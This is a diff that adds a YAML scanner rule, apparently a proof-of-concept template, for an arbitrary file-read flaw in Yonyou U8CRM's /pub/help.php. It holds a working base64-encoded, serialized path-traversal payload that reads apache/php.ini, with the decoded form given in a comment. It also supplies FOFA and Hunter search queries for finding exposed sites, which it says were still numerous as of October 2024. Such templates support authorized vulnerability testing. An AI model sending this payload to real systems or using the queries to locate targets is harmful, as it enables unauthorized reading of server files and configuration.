@@ -1,0 +1,15 @@
+name: yongyou-U8CRM-fileread2     
+rules: 
+  - method: GET 
+    path: /pub/help.php?key=YTozOntpOjA7czoyNDoiLy4uLy4uLy4uL2FwYWNoZS9waHAuaW5pIjtpOjE7czoxOiIxIjtpOjI7czoxOiIyIjt9    #key的值base64解码就是a:3:{i:0;s:24:"/../../../apache/php.ini";i:1;s:1:"1";i:2;s:1:"2";}
+    headers: 
+    body:
+    expression:                        
+      status_code:                 
+      response_header:              
+      response_body: SQL SERVER  Error                     
+detail:                          
+  description: "用友crm pub/help.php接口存在任意文件读取漏洞，截止到2024.10.1仍存在较多该漏洞网站"
+  search:             
+    fofa: body="用友 U8CRM" || title="用友U8CRM" || app="用友U8CRM"
+    鹰图: web.body="用友U8CRM" or web.title="用友U8CRM"
